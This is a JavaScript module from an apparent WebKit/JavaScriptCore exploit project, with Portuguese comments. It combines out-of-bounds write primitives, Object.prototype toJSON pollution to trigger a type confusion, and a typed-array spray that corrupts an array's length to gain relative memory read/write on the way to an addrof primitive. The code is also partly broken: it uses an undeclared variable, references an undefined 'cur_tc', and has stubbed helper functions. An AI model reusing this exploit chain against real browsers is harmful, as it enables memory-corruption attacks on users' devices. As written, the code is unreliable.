// js/script3/testArrayBufferVictimCrash.mjs (R62 - All-In com Corrupção de Length - Corrigido)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// CORRIGIDO: Nome da constante exportada simplificado
export const FNAME_MODULE = "WebKit_Exploit_R62_AllInLengthCorruption";

const VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS = 8;
const PROBE_CALL_LIMIT_V82 = 10;
const OOB_OFFSETS_TO_TEST = [0x7C, 0x78, 0x80];
const OOB_VALUES_TO_TEST = [0xABABABAB, 0xFFFFFFFF];

const CORRUPTION_SPRAY_SIZE = 512;
const CORRUPTION_VICTIM_INDEX = Math.floor(CORRUPTION_SPRAY_SIZE / 2);
const CORRUPTION_OFFSET_SEARCH_RANGE = { start: 0x0, end: 0x400, step: 0x4 };
const CORRUPTION_WRITE_VALUE = 0xFFFFFFFF;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x8); // Assumido

let target_function_for_addrof;
let leaked_address_via_addrof = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

// CORRIGIDO: Nome da função exportada simplificado
export async function executeTest() { 
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: All-In com Corrupção de Length ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init AllIn...`;

    target_function_for_addrof = function someUniqueLeakFunctionR62_Instance() { /*...*/ };
    
    logS3(`--- Fase 0 (AllIn): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    if (!coreOOBReadWriteOK) return { errorOccurred: "OOB Sanity Check Failed" };

    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (AllIn): Não obtido." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (AllIn): Não obtido." },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        length_corruption_details: null
    };
    
    let global_addrof_primitive_found = false;
    let global_webkit_leak_found = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST) {
        if (global_addrof_primitive_found && global_webkit_leak_found) break; 
        for (const current_oob_value of OOB_VALUES_TO_TEST) {
            if (global_addrof_primitive_found && global_webkit_leak_found) break;

            leaked_address_via_addrof = null;
            let addrof_success_this_iteration = false;

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION AllIn: TC Offset: ${current_offset_hex}, TC Valor: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_trigger = null;
            let m1_ref = null; 
            let m2_ref = null;

            let iter_addrof_details = {
                attempted: false, success: false, notes: "", successful_offset: null
            };
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            const corruption_probe_toJSON = () => {
                if (corruption_probe_toJSON.calls === undefined) corruption_probe_toJSON.calls = 0;
                corruption_probe_toJSON.calls++;
                
                if (corruption_probe_toJSON.calls === 1) {
                    m2_ref = { id: "M2_for_len_corr" };
                    m1_ref = { id: "M1_for_len_corr", m2_payload: m2_ref };
                    return m1_ref;
                }
                if (corruption_probe_toJSON.calls === 2 && this === m2_ref) {
                    tc_detected_this_iter = true;
                    tc_details_this_iter = { notes: "TC Confirmada. Definindo getter para ataque."};
                    logS3(`[PROBE_AllIn] TC CONFIRMADA! 'this' é M2. Definindo getter...`, "vuln");
                    
                    Object.defineProperty(this, 'trigger_corruption_prop', {
                        get: function() {
                            logS3("   [GETTER_AllIn] Getter acionado. Iniciando busca por corrupção de length...", "vuln_potential");
                            iter_addrof_details.attempted = true;
                            
                            let arrays = new Array(CORRUPTION_SPRAY_SIZE);
                            for(let i=0; i<CORRUPTION_SPRAY_SIZE; i++) arrays[i] = new Uint32Array(8);
                            
                            let corruptible_view = arrays[CORRUPTION_VICTIM_INDEX];
                            const original_length = corruptible_view.length;

                            for(let offset = CORRUPTION_OFFSET_SEARCH_RANGE.start; offset < CORRUPTION_OFFSET_SEARCH_RANGE.end; offset += CORRUPTION_OFFSET_SEARCH_RANGE.step) {
                                oob_write_absolute(offset, CORRUPTION_WRITE_VALUE, 4);
                                if (corruptible_view.length !== original_length) {
                                    logS3(`   !!! CORRUPÇÃO DE LENGTH ENCONTRADA !!! Offset: ${safeToHex(offset)}`, "success_major");
                                    logS3(`      Length original: ${original_length}, Length corrompido: ${corruptible_view.length}`, "leak");
                                    iter_addrof_details.notes = `Length Corruption bem-sucedida no offset ${safeToHex(offset)}. Novo Length: ${corruptible_view.length}`;
                                    iter_addrof_details.success = true;
                                    iter_addrof_details.successful_offset = offset;
                                    
                                    addrof_success_this_iteration = true;
                                    global_addrof_primitive_found = true;
                                    // Com a corrupção do length, ganhamos uma primitiva R/W relativa.
                                    // Isso é considerado o sucesso do 'addrof' para este teste.
                                    // A construção de um addrof real a partir daqui é a próxima etapa.
                                    break;
                                }
                            }
                            if (!addrof_success_this_iteration) iter_addrof_details.notes = "Nenhum offset encontrado que corrompa o length.";
                            return "corruption_attempt_done";
                        },
                        enumerable: true, configurable: true
                    });
                    return this;
                }
                return {};
            };

            let iter_primary_error = null;
            let iter_stringify_output_raw = null;
            try {
                victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SCRATCHPAD_SIZE_ELEMENTS);
                
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                
                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: corruption_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = JSON.stringify(victim_ta_for_json_trigger);
                    if (tc_detected_this_iter) logS3(`  TC Probe (AllIn): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (AllIn): TC NÃO Confirmada.`, "warn");
                } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
                
                if (addrof_success_this_iteration) {
                    logS3(`  SUCESSO: Primitiva de R/W relativa obtida via corrupção de length!`, "success_major");
                }
                // WebKitLeak não será tentado nesta fase, pois o addrof obtido é a própria R/W relativa.
            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                addrof_details_iter: iter_addrof_details,
                addrof_success_this_iter: addrof_success_this_iteration,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);
            
            // Lógica para atualizar o melhor resultado
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                const cur_addr = current_iter_summary.addrof_success_this_iter;
                if (cur_addr && !best_result_overall.addrof_result.success) {
                    current_is_better = true;
                } else if (!best_result_overall.oob_params_of_best_result) {
                    if (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe) current_is_better = true;
                }

                if (current_is_better) {
                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    best_result_overall.addrof_result.msg = current_iter_summary.addrof_details_iter.notes;
                    best_result_overall.best_iter_addrof_details = current_iter_summary.addrof_details_iter;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof/LenCorr:${cur_addr}, TC:${cur_tc}) ***`, "success_major");
                }
            }
        }
    }

    // Finalizar e retornar o melhor resultado
    best_result_overall.iteration_results_summary = iteration_results_summary;
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (AllIn): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.addrof_result.success) final_title += "LENGTH_CORRUPTION_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    else final_title += "NoSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
